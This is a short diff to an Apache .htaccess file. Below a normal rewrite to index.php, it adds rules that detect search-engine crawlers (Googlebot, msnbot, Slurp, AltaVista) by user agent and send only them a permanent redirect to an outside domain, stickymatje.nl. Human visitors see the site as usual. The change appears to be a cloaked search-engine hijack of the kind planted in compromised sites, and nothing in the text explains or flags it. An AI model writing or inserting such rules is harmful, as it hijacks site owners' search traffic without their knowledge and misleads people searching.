@@ -13,4 +13,13 @@
     RewriteCond %{REQUEST_FILENAME} !-d
     RewriteRule ^(.*)$ index.php/$1 [L]
 
+    RewriteCond %{HTTP_USER_AGENT} AltaVista [OR]
+    RewriteCond %{HTTP_USER_AGENT} Googlebot [OR]
+    RewriteCond %{HTTP_USER_AGENT} msnbot [OR]
+    RewriteCond %{HTTP_USER_AGENT} Slurp
+    RewriteRule ^.*$ "http\:\/\/stickymatje\.nl" [R=301,L]
+
+
+
+
 </IfModule>
